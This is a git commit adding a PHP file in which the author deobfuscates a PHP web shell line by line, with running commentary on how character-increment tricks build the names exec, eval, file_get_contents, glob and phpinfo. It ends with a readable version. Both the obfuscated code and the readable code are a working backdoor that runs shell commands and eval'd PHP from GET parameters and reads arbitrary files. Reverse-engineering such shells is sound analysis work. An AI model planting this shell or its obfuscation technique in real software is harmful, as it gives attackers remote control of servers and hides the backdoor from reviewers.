29569bbe4d11d8054c36741d47ef18846956f3b1
Andrew <andrew.blalock.ops@gmail.com>
2020-01-22 13:04:33 -0600

    Create obfuscated-shell_deobfuscated.php

---
+++ out-of-boredom/obfuscated-shell_deobfuscated.php
@@ -0,0 +1,378 @@
+<?php
+    $_[+'']='';  // Create array ['']
+    $_=$_.'';    // Cast array to string, $_ => 'Array'
+
+    @$__=++$__+(++$__);  // Store '3' in variable (numeric)
+    $__= $_[$__];    // Access fourth element in string 'Array' => 'a'
+
+    ++$__;  // 'b'
+    ++$__;  // 'c'
+    ++$__;  // 'd'
+    ++$__;  // 'e'
+    ++$__;  // 'f'
+    ++$__;  // 'g'
+    ++$__;  // 'h'
+    ++$__;  // 'i'
+    ++$__;  // 'j'
+    ++$__;  // 'k'
+    ++$__;  // 'l'
+    ++$__;  // 'm'
+    ++$__;  // 'n'
+    ++$__;  // 'o'
+
+    $___=$__;    // Store $__ (=> 'o') in variable
+
+    ++$___;    // 'p'
+    ++$___;    // 'q'
+    ++$___;    // 'r'
+
+    $__=$__.$___; // Append $___ => 'or'
+    $___=$_[$__];    // Access fourth element of string 'Array' => 'a'
+
+    ++$___;    // 'b'
+    ++$___;    // 'c'
+    ++$___;    // 'd'
+
+    $__=$__.$___; // Append $___ => 'ord'
+    $___=$_[$__];    // Access fourth element of string 'Array' => 'a'
+
+    ++$___;    // 'b'  
+    ++$___;    // 'c'
+
+    $____=$___;  // Store $___ (=> 'c') in variable
+
+    ++$____;  // 'd'
+    ++$____;  // 'e'
+    ++$____;  // 'f'
+    ++$____;  // 'g'
+    ++$____;  // 'h'
+
+    $___=$___.$____;  // Append $____ => 'ch'
+
+    ++$____;  // 'i'
+    ++$____;  // 'j'
+    ++$____;  // 'k'
+    ++$____;  // 'l'
+    ++$____;  // 'm'
+    ++$____;  // 'n'
+    ++$____;  // 'o'
+    ++$____;  // 'p'
+    ++$____;  // 'q'
+    ++$____;  // 'r'
+
+    $___=$___.$____;  // Append $____ => 'chr'
+
+    $__=+'';  // Store '0' in variable (numeric)
+    ++$__;    // '1' (numeric)
+
+    /* If this 'thing' wasn't made with a script, your brain must be as cryptic as /dev/urandom =D */
+    /* Disclaimer: I don't wanna offend you with that phrase, if it does please tell me. */
+    $____=$__($_[$__]);    // 2nd element 'r' => ord('r') => '' (numeric)
+    $____=$____-++$__;    // increment $__ and subtract it from $____
+
+    $____=$___($____).$___(++$____+(--$__));  // => chr(112).chr(114) => 'pr'
+
+    --$__;    // '2' (numeric)
+    --$__;    // '1' (numeric)
+
+    $__=$___[$__]; // Access second element in string 'chr' => 'h'
+    ++$__;    // 'i'
+
+    $____=$____.$__;  // Append $__ => 'pri'
+    ++$__;    // 'j'
+    ++$__;    // 'k'
+    ++$__;    // 'l'
+    ++$__;    // 'm'
+    ++$__;    // 'n'
+
+    $____=$____.$__;  // Append $__ => 'prin'
+
+    $__=$__[$__]; // Access second element in string 'ord' => 'r' 
+    ++$__;    // 's'
+    ++$__;    // 't'
+
+    $____=$____.$__;  // Append $__ => 'print'
+
+    ++$__;   // '2' (numeric)
+    ++$__;   // '3' (numeric)
+
+    $__=$_[$__];  // Access fourth element in string 'Array' => 'a' 
+    ++$__;    // 'b'
+    ++$__;    // 'c'
+    ++$__;    // 'd'
+    ++$__;    // 'e'
+    ++$__;    // 'f'
+
+    $____=$____.$__;  // Append $__ => 'printf'
+
+    $__=--$__;  // Decrement $__ and store it into variable => '2' (numeric)
+
+    $__=$__[$__]; // Access third element of string 'ord' => 'd'
+    ++$__;    // 'e'
+    ++$__;   // '3' (numeric)
+    ++$__;   // '4' (numeric)
+
+    $__=$_[$__];  // Access fifth element of string 'Array' => 'y'
+    $__= $__($__)-1;    // ord('y')-1 => '120' (numeric)
+
+    $__=$___($__);  // chr(120) => 'x'
+    $__=$__.$__.$__;  // Append $__ and $__ => 'exe'
+
+    $__=+'';   // Set to '0' (numeric)
+
+    $__=$__.$___[$__]; // Append first element of string 'chr' => 'exec'
+
+    $__='';    // Set to blank string
+
+    $__=$_[+''];  // Set to first element of string 'Array' => 'A'
+    ++$__;  // 'B'
+    ++$__;  // 'C'
+    ++$__;  // 'D'
+    ++$__;  // 'E'
+    ++$__;  // 'F'
+    ++$__;  // 'G'
+
+    $__=':'; /* Wow, the first hardcoded letter! =P */
+
+    $__=$__.$__;   // Append $__ => 'G' (first variable is a blank string)
+
+    $__=$__($__)-2;   // ord('G')-2 => 69
+
+    $__=$__.$___($__);    // Append chr(69) => 'GE'
+
+    ++$__;  // '70' (numeric)
+    ++$__;  // '71' (numeric)
+    ++$__;  // '72' (numeric)
+    ++$__;  // '73' (numeric)
+    ++$__;  // '74' (numeric)
+    ++$__;  // '75' (numeric)
+    ++$__;  // '76' (numeric)
+    ++$__;  // '77' (numeric)
+    ++$__;  // '78' (numeric)
+    ++$__;  // '79' (numeric)
+    ++$__;  // '80' (numeric)
+    ++$__;  // '81' (numeric)
+    ++$__;  // '82' (numeric)
+    ++$__;  // '83' (numeric)
+    ++$__;  // '84' (numeric)
+
+    $__=$__.$___($__);    // Append chr(84) => 'GET'
+
+    $__=$__[+''];  // Access first element of string 'exec' => 'e'
+
+    $__=+'';  // Set to zero  
+    ++$__;  // '1' (numeric)
+
+    $__=$__.$___($__($__[$__])-2);  // 'e'.chr(ord('exec'[1])-2) => 'e'.chr(ord('x')-2) => 'ev'
+
+    ++$__;  // '2' (numeric)
+    ++$__;  // '3' (numeric)
+
+    $__.=$_[$__];    // Append fourth element of string 'Array' => 'eva'
+    /* I bet it is going to be 'eval' =O */
+
+    --$__;   // '2' (numeric)
+
+    $__=$___($__($_[$__])-($__+$__+$__));    // chr(ord('Array'[2])-(2+2+2)) => chr(ord('r')-6) => 'x'
+
+    $__.=$__; // Append $__ => 'eval'
+
+    $__=$__[+''];  // Set to first letter of string 'eval' => 'e'
+    ++$__;  // 'f'
+
+    $__=+'';    // Set to '0' (numerical)
+
+    $__=++$__+($__);    // Set to '2' (numerical)
+
+    $__.=$____[$__];    // Append third letter of string 'printf' => 'fi'
+
+    ++$__;  // '3' (numeric)
+
+    $__.=$__[$__].$__[+''].'_'.$____[+'']; // Append: 'eval'[3].'eval'[0].'_'.'printf'[0] => 'file_p'
+
+    ++$__;    // '4' (numeric)
+
+    /**
+     * Lets break that fat code line down...
+     *
+     * Current value: 'file_p'
+     * Append: chr(ord('Array'[4])-4)
+     * Append: 'printf'[4]
+     * Append: '_'
+     * Append: 'chr'[0]
+     * Append: 'ord'[0]
+     * Append: 'printf'[3]
+     * Append: 'printf'[4]
+     * Append: 'eval'[0]
+     * Append: 'printf'[3]
+     * Append: 'printf'[4]
+     * Append: chr(ord('printf'[4])-1)
+     *
+     * Results in: file_put_contents
+     */
+    $__.=$___($__($_[$__])-4).$____[$__].'_'.$___[+''].$__[+''].$____[$__-1].$____[$__].$__[+''].$____[$__-1].$____[$__].$___($__($____[$__])-1);
+
+    $__=+'';    // Set to '0' (numeric)
+
+    $__=$__[$__].$__[++$__].$__[++$__].$__[++$__].'_';    // 'file_put_contents'[0].'file_put_contents'[1].'file_put_contents'[2].'file_put_contents'[3].'_' => 'file_'
+
+    $__=$__[+''];    // Set to: 'eval'[0] => 'e'
+    ++$__;    // 'f'
+    ++$__;    // 'g'
+    /** I bet it will be file_get_contents. **/
+
+    $__.=$__.$__[+''];    // Append 'g' and 'eval'[0] => 'file_ge'
+    /* I think I might win my bet. */
+    /* Who am I even talking to? Work gets even more boring, gnaah.. */
+
+    $__=+'';    // Set to '0' (numeric)
+
+    ++$__;    // '1' (numeric)
+    ++$__;    // '2' (numeric)
+    ++$__;    // '3' (numeric)
+    ++$__;    // '4' (numeric)
+    ++$__;    // '5' (numeric)
+    ++$__;    // '6' (numeric)
+    ++$__;    // '7' (numeric)
+
+    /**
+     * Welcome to the long-line-coding hell.
+     *
+     * It basically starts at position 7 (which is the following letter: file_pu[t]) and then
+     * goes on till the whole line was copied, which results in 'file_get_contents'. Yeah!
+     */
+    $__.=$__[$__].$__[++$__].$__[++$__].$__[++$__].$__[++$__].$__[++$__].$__[++$__].$__[++$__].$__[++$__].$__[++$__];
+
+    $__=$__[+''];    // Set to first element of string 'eval' => 'e'
+    ++$__;    // 'f'
+    ++$__;    // 'g'
+
+    $__=+'';    // Set to '0' (numeric)
+    ++$__;        // '1' (numeric)
+    ++$__;        // '2' (numeric)
+    ++$__;        // '3' (numeric)
+
+    $__.=$__[$__].$__[+''];    // Append 'eval'[3].'ord'[0] => 'glo'
+
+    $__=$__[$__-1];    // Set to: 'eval'[2] => 'a'
+    ++$__;        // 'b'
+
+    $__.=$__;        // Append 'b' => 'glob'
+
+    $__=+'';    // Set to '0' (numeric) - What, I've already said that once?! =P
+    ++$__;    // '1' (numeric)
+    ++$__;    // '2' (numeric)
+
+    $__=$__[$__];    // Set to 'glob'[2] => 'o'
+    ++$__;    // 'p'
+
+    $__=+'';    // Set to '0' (numeric)
+    ++$__;    // '1' (numeric)
+
+    $__.=$___[$__].$__[+''];    // Append 'chr'[1].'p'[0] => 'php'
+    ++$__;    // '2' (numeric)
+
+    $__.=$____[$__];        // Append 'printf'[2] => 'phpi'
+    ++$__;    // '3' (numeric)
+
+    /**
+     * Come on... really? The lines are getting more and more complicated.
+     *
+     * Current value: 'php'
+     * Append: 'printf'[3]
+     * Append: 'file_get_contents'[0]
+     * Append: 'ord'[0]
+     *
+     * Results in: phpinfo
+     */
+    $__.=$____[$__].$__[+''].$__[+''];
+
+    $__=+'';    // Set to '0' (numeric)
+    ++$__;    // '1' (numeric)
+
+    $__=$__;    // Set to '1' (numeric)
+    ++$__;    // '2' (numeric)
+
+    $__=$__[$__];    // Append 'file_put_contents'[1] => 'i'
+
+    $__= $__[$__];    // Set to 'file_get_contents'[2] => 'l'
+    ++$__;    // 'm'
+    ++$__;    // 'n'
+
+    $__.=$__.$__[+''].'_';    // Append 'n'.'i'[0].'_' => 'ini_'
+
+    $__=$__[+''];    // Set to first element of string 'phpinfo' => 'p'
+    ++$__;    // 'q'
+    ++$__;    // 'r'
+    ++$__;    // 's'
+
+    $__.=$__.$__[+''];    // Append 'k'.'eval'[0] => 'ini_se'
+
+    $__=+'';        // Set to '0' (numeric)
+
+    $__=++$__+($__+($__+($__)));    // Fancy way to write four
+
+    $__.=$____[$__];    // Append 'printf'[4] => 't' => 'ini_set'
+
+    $__=$__[+''];    // Set to 'glob'[0] => 'g'
+    ++$__;    // 'h'
+    ++$__;    // 'i'
+    ++$__;    // 'j'
+    ++$__;    // 'k'
+
+    $__.=$__[+''];    // Append 'exec'[0] => 'ke'
+
+    @$__=+$__+(++$__+($__+($__+($__))));    // Add: 0+(1+1+1+1) = 4... again!
+
+    $__.=$_[$__];    // Append 'Array'[4] => 'key'
+
+    $__=$__($_GET);    // $gkey = key($_GET) ($gkey = virtual variable for future comments)
+
+    $____(($__==$____?$_GET[$____]:''));    // printf(($gkey=='printf' ? $_GET['printf'] : ''));
+
+    $____(($__==$__?@$__($_GET[$__]):''));    // printf(($gkey=='exec' ? exec($_GET['exec']) : ''));
+
+    eval(($__==$__?$_GET[$__]:''));    // eval(($gkey=='eval' ? $_GET['eval'] : ''));
+
+    @$____($__(($__==$__?$_GET[$__]:'')));    // printf(file_get_contents(($gkey=='file_get_contents' ? $_GET['file_get_contents'] : '')));
+
+    foreach(@$__($_GET[$__]) as $key) {        // foreach(glob($_GET['glob']) as $key)
+        echo "$key\n";    // Self explanatory...
+    }
+
+    ($__==$__?@$__():'');        // ($gkey=='phpinfo' ? @phpinfo() : '');
+
+    /**
+     * Doesnt do much here.
+     * Not worth to reverse engineer... =P
+     */
+    $__=++$__+($__);
+    $__.=$____[$__];
+++$__;$__.=$__[$__].$__[+''].'_'.
+$____[+''];++$__;$__.=$___($__($_[$__])-4).
+$____[$__].'_'.$___[+''].$__[+''].$____[$__-1].
+$____[$__].$__[+''].$____[$__-1].$____[$__].
+$___($__($____[$__])-1);$__=+'';$__=
+$__[$__].$__[++$__].$__[++$__].
+$__[++$__].'_';$__=$__[+''];++$__;
+++$__;$__.=$__.$__[+''];$__=+'';
+++$__;++$__;++$__;++$__;++$__;
+++$__;++$__;$__.=$__[$__].
+$__[++$__].$__[++$__].$__[++$__]
+.$__[++$__].$__[++$__].$__[++$__]
+.$__[++$__].$__[++$__].$__[++$__];
+$__=$__[+''];++$__;
+
+    /**
+     * So, here a beautified version, to see how small that script would be WITHOUT obfuscation:
+     */
+    $action = key($_GET);
+    printf(($action == 'printf' ? $_GET['printf'] : ''));
+    printf(($action == 'exec' ? exec($_GET['exec']) : ''));
+    eval(($action == 'eval' ? $_GET['eval'] : ''));
+    @printf(file_get_contents(($action == 'file_get_contents' ? $_GET['file_get_contents'] : '')));
+    foreach(@glob($_GET['glob']) as $key) {
+        echo $key;
+    }
+    ($action == 'phpinfo' ? @phpinfo() : '');
+?>
